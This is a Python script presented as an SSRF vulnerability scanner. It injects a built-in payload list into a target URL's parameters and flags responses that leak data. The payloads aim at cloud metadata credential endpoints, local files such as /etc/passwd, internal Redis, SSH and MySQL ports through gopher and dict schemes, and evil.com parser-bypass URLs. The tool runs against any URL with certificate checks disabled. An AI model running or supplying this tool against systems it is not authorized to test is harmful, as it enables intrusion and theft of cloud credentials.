import requests
import urllib.parse
import socket
from colorama import init, Fore, Style

init(autoreset=True)


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN} ADVANCED SSRF VULNERABILITY SCANNER {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    target = input(f"\n{Fore.YELLOW}Target URL with params: {Style.RESET_ALL}").strip()
    if not target.startswith(("http://", "https://")):
        input()
        return

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        input()
        return

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    ssrf_keys = [
        "url", "uri", "path", "dest", "redirect", "next",
        "data", "reference", "site", "callback", "image",
        "img", "load", "fetch", "host", "proxy"
    ]

    test_params = [p for p in params if any(k in p.lower() for k in ssrf_keys)]
    if not test_params:
        test_params = list(params.keys())

    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/metadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:3306",
        "http://172.17.0.1",
        "http://10.0.0.1",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/info",
        "http://localhost@evil.com",
        "http://evil.com#@localhost",
        "http://evil.com?url=http://127.0.0.1",
        "http://2130706433",
        "http://0x7f000001"
    ]

    indicators = {
        "aws": ["ami-id", "instance-id", "security-credentials"],
        "azure": ["compute", "network", "platform"],
        "gcp": ["project", "instance", "attributes"],
        "linux": ["root:x:", "daemon:x:", "bin:x:"],
        "windows": ["[extensions]", "[fonts]"],
        "redis": ["redis_version", "+OK", "ERR"],
        "ssh": ["SSH-", "OpenSSH"],
        "mysql": ["mysql", "handshake"],
    }

    session = requests.Session()
    session.verify = False

    vulnerable = False

    for param in test_params:
        print(f"\n{Fore.CYAN}[→] Testing parameter: {param}{Style.RESET_ALL}")

        for payload in payloads:
            q = params.copy()
            q[param] = payload
            test_url = f"{base_url}?{urllib.parse.urlencode(q, doseq=True)}"

            try:
                headers = {}
                if "169.254.169.254" in payload:
                    headers["Metadata"] = "true"

                r = session.get(
                    test_url,
                    timeout=10,
                    allow_redirects=False,
                    headers=headers
                )

                body = r.text.lower()

                for vuln_type, signs in indicators.items():
                    if any(s in body for s in signs):
                        vulnerable = True
                        color = Fore.MAGENTA + Style.BRIGHT if vuln_type in ["aws", "azure", "gcp"] else Fore.RED
                        print(f"{color}[!] SSRF CONFIRMED ({vuln_type.upper()}){Style.RESET_ALL}")
                        print(f"    Param: {param}")
                        print(f"    Payload: {payload}")
                        print(f"    Status: {r.status_code}")
                        print(f"    Snippet: {r.text[:200].replace(chr(10),' ')[:200]}")
                        break

            except:
                continue

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}RESULT")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if vulnerable:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}[!] SSRF VULNERABILITY DETECTED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Risk: CRITICAL{Style.RESET_ALL}")
        print("• Internal network access")
        print("• Cloud metadata exposure")
        print("• Credential theft")
        print("• Potential RCE via internal services")
    else:
        print(f"{Fore.GREEN}[✓] No SSRF detected in tested vectors{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    input()


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    run()
